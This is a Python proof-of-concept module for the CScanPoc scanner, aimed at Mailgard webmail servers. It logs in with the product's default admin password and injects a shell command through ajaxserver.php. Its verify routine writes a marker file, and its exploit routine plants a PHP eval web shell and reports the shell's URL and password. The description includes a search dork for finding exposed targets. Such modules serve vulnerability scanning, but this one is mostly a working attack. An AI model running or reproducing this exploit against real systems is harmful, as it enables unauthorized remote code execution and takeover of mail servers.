# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import sys


class Vuln(ABVuln):
    vuln_id = 'Mailgard_0005'  # 平台漏洞编号，留空
    name = '佑友(mailgard webmail)邮件服务器getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-29'  # 漏洞公布时间
    desc = '''
        百度搜索intitle:"mailgard webmail"，多家没有改admin密码的中招，默认密码admin/hicomadmin
        /var/www/newmail/src/ajaxserver.php第1789行开始：
        直接毁了magic_quotes_gpc和addslashes的防护（系统自身带了全局过滤，代码抄袭discuz的），导致getshell
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3042/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mailgard'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


def login(target, username, password):
    login_request = ''
    global sessionid
    domain = target.split(".")[1]

    # print 'domain=' + domain
    login_url = target + 'index.php'
    post_data = 'txtname=' + username + '&domain=' + domain + '&txtpwd=' + \
        password + '&languages=zh-cn&button=%E7%99%BB+%E5%BD%95'
    try:
        login_request = requests.post(
            login_url, post_data, allow_redirects=False, verify=False, timeout=3)
        if login_request.status_code == 302:
            print('login succeeded')
            sessionid = login_request.cookies['PHPSESSID']
            return sessionid
        else:
            # print 'login failed,please check username and password'
            return False
    except Exception as e:
        print(Exception, ":", e)
        return False


class Poc(ABPoc):
    poc_id = '7de2ab79-1025-4433-ade9-280167ea6bec'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def myverify(self, target, sessionid):
        getshell_request = ''
        fuckurl = target + 'src/ajaxserver.php?exec=recall'
        getshell_header = {'cookie': 'MAILSESSID=' +
                           str(sessionid) + '; PHPSESSID=' + str(sessionid)}
        getshell_data = 'user=1\'|echo \'<?php echo md5(c); ?>\'>/var/www/newmail/shell123.php #&messageid=1'
        # print getshell_data
        try:
            getshell_request = requests.post(
                fuckurl, getshell_data, headers=getshell_header, allow_redirects=False, verify=False)
            r = requests.get(target + '/shell123.php', verify=False)
            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            print(Exception, ":", e)
            return False

    def getshell(self, target, sessionid):
        getshell_request = ''
        fuckurl = target + 'src/ajaxserver.php?exec=recall'
        getshell_header = {'cookie': 'MAILSESSID=' +
                           str(sessionid) + '; PHPSESSID=' + str(sessionid)}
        getshell_data = 'user=1\'|echo \'<?php eval($_POST[c]);echo md5(c); ?>\'>/var/www/newmail/shell123.php #&messageid=1'
        # print getshell_data
        try:
            getshell_request = requests.post(
                fuckurl, getshell_data, headers=getshell_header, allow_redirects=False, verify=False)
            verify_url = target + '/shell123.php'
            r = requests.get(verify_url, verify=False)

            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))
            else:
                print('getshell failed!')

        except Exception as e:
            print(Exception, ":", e)
            return False

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            target = self.target
            username = 'admin'
            password = 'hicomadmin'
            if (login(target, username, password)):
                print('sessionid=' + sessionid)
                # verify
                self.myverify(target, sessionid)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            target = self.target
            username = 'admin'
            password = 'hicomadmin'
            if (login(target, username, password)):
                print('sessionid=' + sessionid)
                # verify
                self.getshell(target, sessionid)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
